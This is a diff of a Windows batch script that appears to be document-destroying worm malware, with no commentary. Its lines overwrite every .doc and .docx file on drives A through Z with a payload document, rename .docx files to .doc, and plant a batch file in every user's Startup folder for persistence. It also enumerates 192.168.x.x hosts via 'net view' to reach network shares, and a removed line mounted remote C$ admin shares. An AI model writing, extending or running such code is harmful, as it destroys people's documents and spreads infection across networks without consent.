@@ -2,62 +2,58 @@
 SET ii=1
 SET i=0
 :run
-if exist D: (for /f "delims=" %%h in ('dir D:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "D:\%%h"
-for /R "D:" %%f in (*.docx) do ren "%%f" *.doc)
-if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "E:\%%h"
-for /R "E:" %%f in (*.docx) do ren "%%f" *.doc)
-if exist F: (for /f "delims=" %%h in ('dir F:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "F:\%%h"
-for /R "F:" %%f in (*.docx) do ren "%%f" *.doc)
-if exist G: (for /f "delims=" %%h in ('dir G:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "G:\%%h"
-for /R "G:" %%f in (*.docx) do ren "%%f" *.doc)
-if exist H: (for /f "delims=" %%h in ('dir H:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "H:\%%h"
-for /R "H:" %%f in (*.docx) do ren "%%f" *.doc)
-if exist D: (for /f "delims=" %%h in ('dir D:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "D:\%%h")
-if exist E: (for /f "delims=" %%h in ('dir E:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "E:\%%h")
-if exist F: (for /f "delims=" %%h in ('dir F:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "F:\%%h")
-if exist G: (for /f "delims=" %%h in ('dir G:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "G:\%%h")
-if exist H: (for /f "delims=" %%h in ('dir H:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "H:\%%h")
-for /f %%x in ('net view \\192.168.%i%.%ii%') do pushd \\192.168.%i%.%ii%\%%x
-if exist X: (for /f "delims=" %%h in ('dir X:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "X:\%%h")
-for /R "X:" %%f in (*.docx) do ren "%%f" *.doc
-if exist X: (for /f "delims=" %%h in ('dir X:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "X:\%%h")
-if exist Y: (for /f "delims=" %%h in ('dir Y:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "Y:\%%h")
-for /R "Y:" %%f in (*.docx) do ren "%%f" *.doc
-if exist Y: (for /f "delims=" %%h in ('dir Y:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "Y:\%%h")
-if exist Z: (for /f "delims=" %%h in ('dir Z:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "Z:\%%h")
-for /R "Z:" %%f in (*.docx) do ren "%%f" *.doc
-if exist Z: (for /f "delims=" %%h in ('dir Z:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "Z:\%%h")
-if exist D: (for /f "delims=" %%h in ('dir D:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "D:\%%h"
-for /R "D:" %%f in (*.docx) do ren "%%f" *.doc)
-if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "E:\%%h"
-for /R "E:" %%f in (*.docx) do ren "%%f" *.doc)
-if exist F: (for /f "delims=" %%h in ('dir F:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "F:\%%h"
-for /R "F:" %%f in (*.docx) do ren "%%f" *.doc)
-if exist G: (for /f "delims=" %%h in ('dir G:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "G:\%%h"
-for /R "G:" %%f in (*.docx) do ren "%%f" *.doc)
-if exist H: (for /f "delims=" %%h in ('dir H:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "H:\%%h"
-for /R "H:" %%f in (*.docx) do ren "%%f" *.doc)
-if exist D: (for /f "delims=" %%h in ('dir D:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "D:\%%h")
-if exist E: (for /f "delims=" %%h in ('dir E:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "E:\%%h")
-if exist F: (for /f "delims=" %%h in ('dir F:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "F:\%%h")
-if exist G: (for /f "delims=" %%h in ('dir G:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "G:\%%h")
-if exist H: (for /f "delims=" %%h in ('dir H:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "H:\%%h")
-pushd \\192.168.%i%.%ii%\C$
+if exist A: (for /f %%x in ('dir A:\Users /b') do mkdir "A:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist A: (for /f %%u in ('dir A:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "A:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist B: (for /f %%x in ('dir B:\Users /b') do mkdir "B:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist B: (for /f %%u in ('dir B:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "B:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist C: (for /f %%x in ('dir C:\Users /b') do mkdir "C:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist C: (for /f %%u in ('dir C:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "C:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist D: (for /f %%x in ('dir D:\Users /b') do mkdir "D:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist D: (for /f %%u in ('dir D:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "D:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist E: (for /f %%x in ('dir E:\Users /b') do mkdir "E:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist E: (for /f %%u in ('dir E:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "E:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist F: (for /f %%x in ('dir F:\Users /b') do mkdir "F:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist F: (for /f %%u in ('dir F:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "F:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist G: (for /f %%x in ('dir G:\Users /b') do mkdir "G:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist G: (for /f %%u in ('dir G:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "G:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist H: (for /f %%x in ('dir H:\Users /b') do mkdir "H:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist H: (for /f %%u in ('dir H:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "H:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist I: (for /f %%x in ('dir I:\Users /b') do mkdir "I:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist I: (for /f %%u in ('dir I:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "I:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist J: (for /f %%x in ('dir J:\Users /b') do mkdir "J:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist J: (for /f %%u in ('dir J:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "J:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist K: (for /f %%x in ('dir K:\Users /b') do mkdir "K:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist K: (for /f %%u in ('dir K:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "K:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist L: (for /f %%x in ('dir L:\Users /b') do mkdir "L:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist L: (for /f %%u in ('dir L:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "L:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist M: (for /f %%x in ('dir M:\Users /b') do mkdir "M:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist M: (for /f %%u in ('dir M:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "M:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist N: (for /f %%x in ('dir N:\Users /b') do mkdir "N:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist N: (for /f %%u in ('dir N:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "N:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist O: (for /f %%x in ('dir O:\Users /b') do mkdir "O:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist O: (for /f %%u in ('dir O:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "O:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist P: (for /f %%x in ('dir P:\Users /b') do mkdir "P:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist P: (for /f %%u in ('dir P:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "P:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist Q: (for /f %%x in ('dir Q:\Users /b') do mkdir "Q:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist Q: (for /f %%u in ('dir Q:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "Q:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist R: (for /f %%x in ('dir R:\Users /b') do mkdir "R:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist R: (for /f %%u in ('dir R:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "R:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist S: (for /f %%x in ('dir S:\Users /b') do mkdir "S:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist S: (for /f %%u in ('dir S:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "S:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist T: (for /f %%x in ('dir T:\Users /b') do mkdir "T:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist T: (for /f %%u in ('dir T:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "T:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist U: (for /f %%x in ('dir U:\Users /b') do mkdir "U:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist U: (for /f %%u in ('dir U:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "U:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist V: (for /f %%x in ('dir V:\Users /b') do mkdir "V:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist V: (for /f %%u in ('dir V:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "V:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist W: (for /f %%x in ('dir W:\Users /b') do mkdir "W:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist W: (for /f %%u in ('dir W:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "W:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
 if exist X: (for /f %%x in ('dir X:\Users /b') do mkdir "X:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
 if exist X: (for /f %%u in ('dir X:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "X:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
-if exist X: (for /f "delims=" %%h in ('dir X:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "X:\%%h")
-for /R "X:" %%f in (*.docx) do ren "%%f" *.doc
-if exist X: (for /f "delims=" %%h in ('dir X:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "X:\%%h")
 if exist Y: (for /f %%x in ('dir Y:\Users /b') do mkdir "Y:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
 if exist Y: (for /f %%u in ('dir Y:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "Y:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
-if exist Y: (for /f "delims=" %%h in ('dir Y:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "Y:\%%h")
-for /R "Y:" %%f in (*.docx) do ren "%%f" *.doc
-if exist Y: (for /f "delims=" %%h in ('dir Y:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "Y:\%%h")
 if exist Z: (for /f %%x in ('dir Z:\Users /b') do mkdir "Z:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
 if exist Z: (for /f %%u in ('dir Z:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "Z:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
-if exist Z: (for /f "delims=" %%h in ('dir Z:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "Z:\%%h")
-for /R "Z:" %%f in (*.docx) do ren "%%f" *.doc
-if exist Z: (for /f "delims=" %%h in ('dir Z:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "Z:\%%h")
 if exist D: (for /f "delims=" %%h in ('dir D:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "D:\%%h"
 for /R "D:" %%f in (*.docx) do ren "%%f" *.doc)
 if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "E:\%%h"
@@ -68,11 +64,310 @@ if exist G: (for /f "delims=" %%h in ('dir G:\*.docx /b') do copy /Y "C:\Program
 for /R "G:" %%f in (*.docx) do ren "%%f" *.doc)
 if exist H: (for /f "delims=" %%h in ('dir H:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "H:\%%h"
 for /R "H:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist I: (for /f "delims=" %%h in ('dir I:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "I:\%%h"
+for /R "I:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist J: (for /f "delims=" %%h in ('dir J:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "J:\%%h"
+for /R "J:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist K: (for /f "delims=" %%h in ('dir K:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "K:\%%h"
+for /R "K:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist L: (for /f "delims=" %%h in ('dir L:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "L:\%%h"
+for /R "L:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist M: (for /f "delims=" %%h in ('dir M:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "M:\%%h"
+for /R "M:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist N: (for /f "delims=" %%h in ('dir N:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "N:\%%h"
+for /R "N:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist O: (for /f "delims=" %%h in ('dir O:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "O:\%%h"
+for /R "O:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist P: (for /f "delims=" %%h in ('dir P:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "P:\%%h"
+for /R "P:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist Q: (for /f "delims=" %%h in ('dir Q:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "Q:\%%h"
+for /R "Q:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist R: (for /f "delims=" %%h in ('dir R:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "R:\%%h"
+for /R "R:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist S: (for /f "delims=" %%h in ('dir S:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "S:\%%h"
+for /R "S:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist T: (for /f "delims=" %%h in ('dir T:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "T:\%%h"
+for /R "T:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist U: (for /f "delims=" %%h in ('dir U:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "U:\%%h"
+for /R "U:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist V: (for /f "delims=" %%h in ('dir V:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "V:\%%h"
+for /R "V:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist W: (for /f "delims=" %%h in ('dir W:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "W:\%%h"
+for /R "W:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist X: (for /f "delims=" %%h in ('dir X:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "X:\%%h"
+for /R "X:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist Y: (for /f "delims=" %%h in ('dir Y:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "Y:\%%h"
+for /R "Y:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist Z: (for /f "delims=" %%h in ('dir Z:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "Z:\%%h"
+for /R "Z:" %%f in (*.docx) do ren "%%f" *.doc)
 if exist D: (for /f "delims=" %%h in ('dir D:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "D:\%%h")
 if exist E: (for /f "delims=" %%h in ('dir E:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "E:\%%h")
 if exist F: (for /f "delims=" %%h in ('dir F:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "F:\%%h")
 if exist G: (for /f "delims=" %%h in ('dir G:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "G:\%%h")
 if exist H: (for /f "delims=" %%h in ('dir H:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "H:\%%h")
+if exist I: (for /f "delims=" %%h in ('dir I:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "I:\%%h")
+if exist J: (for /f "delims=" %%h in ('dir J:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "J:\%%h")
+if exist K: (for /f "delims=" %%h in ('dir K:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "K:\%%h")
+if exist L: (for /f "delims=" %%h in ('dir L:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "L:\%%h")
+if exist M: (for /f "delims=" %%h in ('dir M:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "M:\%%h")
+if exist N: (for /f "delims=" %%h in ('dir N:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "N:\%%h")
+if exist O: (for /f "delims=" %%h in ('dir O:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "O:\%%h")
+if exist P: (for /f "delims=" %%h in ('dir P:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "P:\%%h")
+if exist Q: (for /f "delims=" %%h in ('dir Q:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "Q:\%%h")
+if exist R: (for /f "delims=" %%h in ('dir R:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "R:\%%h")
+if exist S: (for /f "delims=" %%h in ('dir S:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "S:\%%h")
+if exist T: (for /f "delims=" %%h in ('dir T:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "T:\%%h")
+if exist U: (for /f "delims=" %%h in ('dir U:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "U:\%%h")
+if exist V: (for /f "delims=" %%h in ('dir V:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "V:\%%h")
+if exist W: (for /f "delims=" %%h in ('dir W:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "W:\%%h")
+if exist X: (for /f "delims=" %%h in ('dir X:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "X:\%%h")
+if exist Y: (for /f "delims=" %%h in ('dir Y:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "Y:\%%h")
+if exist Z: (for /f "delims=" %%h in ('dir Z:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "Z:\%%h")
+for /f %%x in ('net view \\192.168.%i%.%ii%') do pushd \\192.168.%i%.%ii%\%%x
+if exist A: (for /f %%x in ('dir A:\Users /b') do mkdir "A:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist A: (for /f %%u in ('dir A:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "A:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist B: (for /f %%x in ('dir B:\Users /b') do mkdir "B:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist B: (for /f %%u in ('dir B:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "B:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist C: (for /f %%x in ('dir C:\Users /b') do mkdir "C:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist C: (for /f %%u in ('dir C:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "C:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist D: (for /f %%x in ('dir D:\Users /b') do mkdir "D:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist D: (for /f %%u in ('dir D:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "D:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist E: (for /f %%x in ('dir E:\Users /b') do mkdir "E:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist E: (for /f %%u in ('dir E:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "E:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist F: (for /f %%x in ('dir F:\Users /b') do mkdir "F:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist F: (for /f %%u in ('dir F:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "F:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist G: (for /f %%x in ('dir G:\Users /b') do mkdir "G:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist G: (for /f %%u in ('dir G:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "G:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist H: (for /f %%x in ('dir H:\Users /b') do mkdir "H:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist H: (for /f %%u in ('dir H:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "H:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist I: (for /f %%x in ('dir I:\Users /b') do mkdir "I:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist I: (for /f %%u in ('dir I:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "I:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist J: (for /f %%x in ('dir J:\Users /b') do mkdir "J:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist J: (for /f %%u in ('dir J:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "J:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist K: (for /f %%x in ('dir K:\Users /b') do mkdir "K:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist K: (for /f %%u in ('dir K:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "K:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist L: (for /f %%x in ('dir L:\Users /b') do mkdir "L:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist L: (for /f %%u in ('dir L:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "L:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist M: (for /f %%x in ('dir M:\Users /b') do mkdir "M:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist M: (for /f %%u in ('dir M:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "M:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist N: (for /f %%x in ('dir N:\Users /b') do mkdir "N:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist N: (for /f %%u in ('dir N:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "N:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist O: (for /f %%x in ('dir O:\Users /b') do mkdir "O:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist O: (for /f %%u in ('dir O:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "O:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist P: (for /f %%x in ('dir P:\Users /b') do mkdir "P:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist P: (for /f %%u in ('dir P:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "P:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist Q: (for /f %%x in ('dir Q:\Users /b') do mkdir "Q:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist Q: (for /f %%u in ('dir Q:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "Q:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist R: (for /f %%x in ('dir R:\Users /b') do mkdir "R:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist R: (for /f %%u in ('dir R:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "R:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist S: (for /f %%x in ('dir S:\Users /b') do mkdir "S:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist S: (for /f %%u in ('dir S:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "S:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist T: (for /f %%x in ('dir T:\Users /b') do mkdir "T:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist T: (for /f %%u in ('dir T:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "T:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist U: (for /f %%x in ('dir U:\Users /b') do mkdir "U:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
